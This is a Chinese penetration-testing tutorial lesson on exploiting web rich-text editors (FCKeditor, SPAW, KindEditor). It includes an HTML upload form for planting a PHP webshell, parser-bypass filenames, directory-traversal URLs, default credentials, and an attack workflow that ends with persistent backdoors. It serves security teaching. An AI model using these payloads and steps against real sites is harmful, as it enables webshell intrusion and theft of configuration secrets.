# 经典15年i春秋渗透测试系统化教程 - P52：课时10 编辑器漏洞讲解（下）🔓

在本节课中，我们将继续学习几种常见编辑器（FCKeditor、SPAW、KindEditor）的漏洞利用方法，包括文件上传、目录遍历和解析漏洞等。我们将通过具体的路径和代码示例，讲解如何发现和利用这些安全缺陷。

![](img/c4e63c655201a8ef9566e70eeb894579_1.png)

![](img/c4e63c655201a8ef9566e70eeb894579_2.png)

上一节我们介绍了FCKeditor在ASP环境下的漏洞，本节中我们来看看其在PHP、JSP等环境下的情况，以及其他编辑器的安全问题。

![](img/c4e63c655201a8ef9566e70eeb894579_4.png)

## FCKeditor PHP版本漏洞利用

![](img/c4e63c655201a8ef9566e70eeb894579_6.png)

![](img/c4e63c655201a8ef9566e70eeb894579_8.png)

![](img/c4e63c655201a8ef9566e70eeb894579_9.png)

FCKeditor的PHP版本（2.0至2.4.3之间）存在文件上传漏洞。利用前，需要在配置文件 `config.php` 中开启上传功能。

![](img/c4e63c655201a8ef9566e70eeb894579_11.png)

![](img/c4e63c655201a8ef9566e70eeb894579_13.png)

![](img/c4e63c655201a8ef9566e70eeb894579_15.png)

其默认的上传路径为：
```
/FCKeditor/editor/filemanager/browser/default/connectors/php/upload.php
```

![](img/c4e63c655201a8ef9566e70eeb894579_17.png)

以下是利用该漏洞的EXP代码。请将以下代码保存为HTML文件。

![](img/c4e63c655201a8ef9566e70eeb894579_19.png)

![](img/c4e63c655201a8ef9566e70eeb894579_21.png)

```html
<!-- 保存为 exploit.html -->
<form action="http://目标域名/FCKeditor/editor/filemanager/browser/default/connectors/php/upload.php?Type=Media" enctype="multipart/form-data" method="post">
    <input type="file" name="NewFile">
    <input type="submit" value="Submit">
</form>
```

![](img/c4e63c655201a8ef9566e70eeb894579_23.png)

![](img/c4e63c655201a8ef9566e70eeb894579_25.png)

**利用步骤如下：**

![](img/c4e63c655201a8ef9566e70eeb894579_27.png)

![](img/c4e63c655201a8ef9566e70eeb894579_29.png)

1.  将上述代码保存为 `exploit.html`。
2.  在浏览器中打开该HTML文件，会出现文件选择按钮。
3.  选择一个PHP木马文件，点击提交（Submit）按钮。
4.  上传后，页面可能会报错，但这不影响。在页面右键选择“查看源代码”。
5.  在源代码中，寻找类似 `onUploadCompleted` 的JavaScript函数，其中会包含实际上传后的文件路径，例如 `/userfiles/media/your_shell.php`。
6.  访问该路径即可执行上传的PHP木马。

![](img/c4e63c655201a8ef9566e70eeb894579_31.png)

![](img/c4e63c655201a8ef9566e70eeb894579_33.png)

**注意：** 如果访问上传的文件时出现404错误，可以尝试按键盘上的 **F12** 键打开开发者工具，在控制台（Console）或网络（Network）标签页中查看更详细的错误信息或请求，这有时会揭示真实的路径。

![](img/c4e63c655201a8ef9566e70eeb894579_35.png)

## FCKeditor 文件解析漏洞

![](img/c4e63c655201a8ef9566e70eeb894579_37.png)

![](img/c4e63c655201a8ef9566e70eeb894579_39.png)

![](img/c4e63c655201a8ef9566e70eeb894579_40.png)

FCKeditor在某些版本中存在文件解析漏洞，允许上传特定后缀的文件并被当作脚本执行。

![](img/c4e63c655201a8ef9566e70eeb894579_42.png)

![](img/c4e63c655201a8ef9566e70eeb894579_44.png)

![](img/c4e63c655201a8ef9566e70eeb894579_46.png)

*   **IIS 6.0解析漏洞：** 可上传名为 `shell.asp;.jpg` 的文件，IIS 6.0会将其解析为ASP文件执行。
*   **Apache解析漏洞：** 可上传名为 `shell.php.xxx` 的文件（`xxx`为任意未在MIME类型中定义的扩展名），Apache会从右向左解析，遇到认识的扩展名（如`.php`）即停止，从而将文件当作PHP执行。

![](img/c4e63c655201a8ef9566e70eeb894579_48.png)

![](img/c4e63c655201a8ef9566e70eeb894579_49.png)

![](img/c4e63c655201a8ef9566e70eeb894579_51.png)

利用方法通常是使用Burp Suite拦截上传请求，修改文件名或数据包内容来绕过检测。

## FCKeditor JSP/ASPX版本目录遍历

![](img/c4e63c655201a8ef9566e70eeb894579_53.png)

![](img/c4e63c655201a8ef9566e70eeb894579_54.png)

在JSP和ASPX版本的FCKeditor中，存在目录遍历漏洞，可以读取服务器上的任意文件。

![](img/c4e63c655201a8ef9566e70eeb894579_56.png)

![](img/c4e63c655201a8ef9566e70eeb894579_58.png)

*   **JSP版本路径示例：**
    ```
    /FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    ```
    将 `CurrentFolder` 参数值改为 `../../../` 等路径即可尝试遍历目录。

![](img/c4e63c655201a8ef9566e70eeb894579_60.png)

![](img/c4e63c655201a8ef9566e70eeb894579_62.png)

*   **ASPX版本路径示例：**
    ```
    /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    ```
    同样，修改 `CurrentFolder` 参数可以进行目录遍历。

![](img/c4e63c655201a8ef9566e70eeb894579_64.png)

![](img/c4e63c655201a8ef9566e70eeb894579_65.png)

![](img/c4e63c655201a8ef9566e70eeb894579_67.png)

此漏洞的危害在于可能直接读取到网站的配置文件（如 `config.php`、`web.config`），从而获取数据库连接信息或后台管理密码。

## SPAW编辑器漏洞

![](img/c4e63c655201a8ef9566e70eeb894579_69.png)

![](img/c4e63c655201a8ef9566e70eeb894579_71.png)

SPAW编辑器（1.0和2.0的PHP版本）存在文件上传漏洞，并可结合Apache解析漏洞利用。

![](img/c4e63c655201a8ef9566e70eeb894579_73.png)

其默认的上传路径为：
```
/spaw2/uploads/
```

![](img/c4e63c655201a8ef9566e70eeb894579_74.png)

可以尝试上传一个包含PHP代码但后缀为 `.php;.jpg` 的文件。如果服务器是Apache，且存在解析漏洞，该文件可能被当作PHP执行。

![](img/c4e63c655201a8ef9566e70eeb894579_76.png)

## KindEditor编辑器目录遍历

![](img/c4e63c655201a8ef9566e70eeb894579_78.png)

KindEditor的PHP版本（3.4.2至3.5.5）存在目录遍历漏洞。

![](img/c4e63c655201a8ef9566e70eeb894579_80.png)

![](img/c4e63c655201a8ef9566e70eeb894579_82.png)

![](img/c4e63c655201a8ef9566e70eeb894579_83.png)

漏洞路径示例：
```
/kindeditor/php/file_manager_json.php?path=../
```

访问该路径，并在 `path` 参数后添加 `../` 即可尝试遍历上一级目录，有时会直接返回服务器的绝对路径信息。

![](img/c4e63c655201a8ef9566e70eeb894579_85.png)

## 编辑器漏洞渗透思路总结

![](img/c4e63c655201a8ef9566e70eeb894579_87.png)

![](img/c4e63c655201a8ef9566e70eeb894579_89.png)

![](img/c4e63c655201a8ef9566e70eeb894579_90.png)

本节课我们一起学习了多种编辑器漏洞的利用方式。以下是针对编辑器漏洞的通用渗透测试思路：

![](img/c4e63c655201a8ef9566e70eeb894579_92.png)

**以下是常见的攻击面：**

![](img/c4e63c655201a8ef9566e70eeb894579_94.png)

![](img/c4e63c655201a8ef9566e70eeb894579_95.png)

1.  **文件上传漏洞：** 这是编辑器最常见的问题。利用解析漏洞（IIS/Apache）或黑名单不全，上传Webshell。
2.  **默认凭据：** 许多编辑器后台或配置文件使用弱密码，如 `admin/admin888`。
3.  **目录遍历/信息泄露：** 通过漏洞读取配置文件，获取数据库密码、后台路径等敏感信息。
4.  **会话漏洞：** 在编辑器后台修改密码、文件管理等处，可能存在SQL注入或可插入恶意代码。
5.  **前端验证绕过：** 上传功能仅在前端用JavaScript验证文件类型，可通过禁用浏览器JS或Burp Suite拦截修改数据包轻松绕过。
6.  **权限配置不当：** 编辑器目录权限设置过宽，导致未授权访问或文件被任意修改。

![](img/c4e63c655201a8ef9566e70eeb894579_97.png)

![](img/c4e63c655201a8ef9566e70eeb894579_98.png)

**以下是基本的渗透步骤：**

![](img/c4e63c655201a8ef9566e70eeb894579_100.png)

*   **信息收集：** 识别网站使用的编辑器及其版本（通过特征目录、文件、JS引用等）。
*   **漏洞探测：** 根据版本搜索已知漏洞，尝试访问默认路径、使用默认密码、测试上传功能等。
*   **漏洞利用：** 利用找到的漏洞上传Webshell、读取敏感文件、获取后台权限等。
*   **权限提升与维持：** 通过获得的立足点，进一步探测服务器信息，尝试提权，并部署持久化后门。

![](img/c4e63c655201a8ef9566e70eeb894579_102.png)

![](img/c4e63c655201a8ef9566e70eeb894579_103.png)

![](img/c4e63c655201a8ef9566e70eeb894579_104.png)

编辑器为网站管理提供了便利，但也常常成为安全链条中最薄弱的一环。由于其功能复杂且往往被开发者忽视安全加固，因此是渗透测试中需要重点检查的对象。建议大家课后多搜集相关资料进行实践，并不断完善自己的漏洞知识库。